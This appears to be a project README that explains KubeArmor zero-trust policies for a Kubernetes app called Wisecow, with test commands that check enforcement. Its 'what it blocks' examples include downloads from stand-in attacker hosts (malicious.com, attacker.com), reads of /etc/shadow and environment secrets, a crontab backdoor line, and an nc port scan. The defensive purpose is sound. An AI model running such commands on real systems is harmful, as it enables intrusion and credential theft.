# KubeArmor Zero-Trust Security for Wisecow
---

## KubeArmor Architecture

```
┌────────────────────────────────────────┐
│          Kubernetes Cluster            │
│  ┌────────────────────────────────┐    │
│  │      Wisecow Pod               │    │
│  │  ┌──────────────────────┐      │    │
│  │  │  Application Process  │     │    │
│  │  └──────────┬────────────┘     │    │
│  │             │                  │    │
│  │             ▼                  │    │
│  │  ┌──────────────────────┐      │    │
│  │  │  KubeArmor Agent     │      │    │
│  │  │  (eBPF/LSM Monitor)  │      │    │
│  │  └──────────┬────────────┘     │    │
│  └─────────────┼──────────────────┘    │
│                │                       │
│                ▼                       │
│  ┌──────────────────────────┐          │
│  │  KubeArmor Controller    │          │
│  │  (Policy Enforcement)    │          │
│  └──────────────────────────┘          │
└────────────────────────────────────────┘
```

**How it works:**
1. **eBPF Monitoring**: Kernel-level monitoring without code changes
2. **Policy Evaluation**: Checks every system call against policies
3. **Enforcement**: Blocks or audits violations in real-time
4. **Logging**: Records all security events

---

# Security Policies Explained

## Policy 1: Process Execution Restrictions

**File**: `wisecow-restrict-process-execution.yaml`

**Purpose**: Prevent attackers from executing shells and downloading malware

**What it blocks:**
```bash
# These commands will be blocked:
kubectl exec wisecow-pod -- /bin/sh
kubectl exec wisecow-pod -- /bin/bash
kubectl exec wisecow-pod -- curl http://malicious.com/malware
kubectl exec wisecow-pod -- wget http://attacker.com/script.sh
kubectl exec wisecow-pod -- apt-get install netcat
```

**Why this matters:**
- **Remote Code Execution (RCE)**: Attackers often try to get shell access
- **Malware Download**: Prevents downloading and executing malicious tools
- **Lateral Movement**: Blocks tools used to explore and attack other systems

**Real-world scenario:**
> Attacker compromises web application → Tries to spawn reverse shell → KubeArmor blocks it

## Policy 2: File System Access Control

**File**: `wisecow-restrict-file-access.yaml`

**Purpose**: Protect sensitive system files and prevent tampering

**What it blocks:**
```bash
# Reading sensitive files
cat /etc/shadow          # Block: Contains password hashes
cat /etc/passwd          # Block: User information
cat /proc/self/environ   # Block: Environment variables (may contain secrets)

# Writing to system directories
echo "backdoor" >> /etc/crontab    # Block: Adding persistent backdoor
touch /tmp/malware.sh              # Block: Staging malware
chmod +x /bin/backdoor             # Block: Modifying system binaries
```

**Why this matters:**
- **Data Exfiltration**: Prevents reading secrets from config files
- **Persistence**: Blocks creation of backdoors
- **System Tampering**: Prevents modification of critical system files

**Real-world scenario:**
> Container escape vulnerability discovered → Attacker tries to read /etc/shadow → KubeArmor blocks it

## Policy 3: Network Access Control

**File**: `wisecow-restrict-network-access.yaml`

**Purpose**: Limit network access to prevent reconnaissance and data exfiltration

**What it blocks:**
```bash
# Network scanning
ping 10.0.0.1              # Block: ICMP reconnaissance
nc -zv 10.0.0.1 1-65535    # Block: Port scanning
traceroute google.com       # Block: Network mapping
```

**Why this matters:**
- **Reconnaissance**: Prevents attackers from mapping internal network
- **Lateral Movement**: Blocks connections to other internal services
- **Data Exfiltration**: Limits outbound connections

**Real-world scenario:**
> Compromised container → Attacker scans internal network → KubeArmor blocks raw sockets

## Policy 4: Capabilities Restriction

**File**: `wisecow-restrict-capabilities.yaml`

**Purpose**: Prevent privilege escalation and dangerous operations

**Linux Capabilities Blocked:**
- **CAP_NET_RAW**: Create raw sockets (network sniffing)
- **CAP_SYS_ADMIN**: Mount filesystems, load kernel modules
- **CAP_SYS_PTRACE**: Debug other processes (steal credentials)
- **CAP_DAC_OVERRIDE**: Bypass file permissions
- **CAP_SETUID/SETGID**: Change user/group IDs (privilege escalation)

**Why this matters:**
- **Privilege Escalation**: Prevents container breakout attacks
- **Network Sniffing**: Blocks packet capture tools
- **Process Injection**: Prevents debugging/injecting into other processes

**Real-world scenario:**
> Vulnerability allows capability abuse → Attacker tries to mount host filesystem → KubeArmor blocks CAP_SYS_ADMIN

## Policy 5: Audit Mode Policy

**File**: `wisecow-audit-all-processes.yaml`

**Purpose**: Visibility without enforcement (useful for initial deployment)

**Use case:**
1. Deploy application with audit policy
2. Monitor what processes actually run
3. Create allowlist based on observed behavior
4. Switch to enforcement mode

**Example workflow:**
```bash
# Phase 1: Audit (Day 1-7)
# Observe: Application uses /usr/bin/python3, /usr/bin/node

# Phase 2: Create allowlist (Day 8)
# Allow only observed legitimate processes

# Phase 3: Enforce (Day 9+)
# Block everything not on allowlist
```

---

## Testing and Capturing Violations

### Manual Testing Commands

#### Test 1: Shell Execution (Should be Blocked)
```bash
# Get pod name
POD_NAME=$(kubectl get pods -l app=wisecow -o jsonpath='{.items[0].metadata.name}')

# Try to execute shell
kubectl exec $POD_NAME -- /bin/sh -c "echo 'Hacked!'"

# Expected output:
# Error: command terminated with exit code 137
# ✓ This means KubeArmor blocked it!
```

#### Test 2: Read Sensitive Files (Should be Blocked)
```bash
# Try to read password file
kubectl exec $POD_NAME -- cat /etc/shadow

# Expected output:
# cat: /etc/shadow: Operation not permitted
# ✓ KubeArmor blocked file access!
```

#### Test 3: Write to Filesystem (Should be Blocked)
```bash
# Try to create file in /tmp
kubectl exec $POD_NAME -- touch /tmp/malicious.sh

# Expected output:
# touch: cannot touch '/tmp/malicious.sh': Operation not permitted
# ✓ Write blocked by policy!
```

#### Test 4: Network Scanning (Should be Blocked)
```bash
# Try to ping another service
kubectl exec $POD_NAME -- ping -c 1 8.8.8.8

# Expected output:
# ping: permission denied (socket: Operation not permitted)
# ✓ Raw socket blocked!
```

### Viewing Policy Violations

#### Check KubeArmor Logs
```bash
# View real-time alerts
kubectl logs -n kubearmor -l kubearmor-app=kubearmor --tail=50

# Filter for violations
kubectl logs -n kubearmor -l kubearmor-app=kubearmor | grep -i "alert\|block\|violation"
```

```

#### Check Policy Status
```bash
# List all policies
kubectl get kubearmorpolicies -A

# Describe specific policy
kubectl describe kubearmorpolicy wisecow-restrict-process-execution -n default

# Check policy enforcement status
kubectl get kubearmorpolicies -o json | jq '.items[].status'
```

### Capturing Screenshots for Documentation

#### Screenshot 1: Policy Application
```bash
# Show all applied policies
kubectl get kubearmorpolicies -A -o wide
```
**Capture this output showing 5 policies applied to wisecow**

#### Screenshot 2: Blocked Shell Execution
```bash
# Run the test
kubectl exec $POD_NAME -- /bin/sh -c "whoami"
```
**Capture the "command terminated with exit code 137" error**

#### Screenshot 3: KubeArmor Alert Logs
```bash
# Show violation logs
kubectl logs -n kubearmor -l kubearmor-app=kubearmor --tail=20 | grep "Block"
```
**Capture logs showing "Action": "Block" entries**

#### Screenshot 4: File Access Denial
```bash
# Attempt to read shadow file
kubectl exec $POD_NAME -- cat /etc/shadow
```
**Capture "Operation not permitted" error**

#### Screenshot 5: Policy Description
```bash
# Show policy details
kubectl describe kubearmorpolicy wisecow-restrict-process-execution
```
**Capture policy spec showing blocked processes**

---

## Project Structure

```
wisecow-project/
├── .github/
│   └── workflows/
│       └── main.yml        
├── kubernetes/
│   ├── deployment.yaml
│   ├── service.yaml
│   ├── ingress.yaml
│──── kubearmor-policies/
│     ├── process-restriction.yaml
│     ├── file-access-control.yaml
│     ├── network-restriction.yaml
│     ├── capabilities-restriction.yaml
│     └── audit-policy.yaml
└── README.md
```


## Screenshots of KubeArmour Results

<img src="https://github.com/soniyada/wisecow-with-KubeArmour/blob/main/screenshots/screenshot-2025-10-26_16-44-31.png" alt="Banner" />
<img src="https://github.com/soniyada/wisecow-with-KubeArmour/blob/main/screenshots/screenshot-2025-10-26_16-44-58.png" alt="Banner" />
<img src="https://github.com/soniyada/wisecow-with-KubeArmour/blob/main/screenshots/screenshot-2025-10-26_16-46-05.png" alt="Banner" />

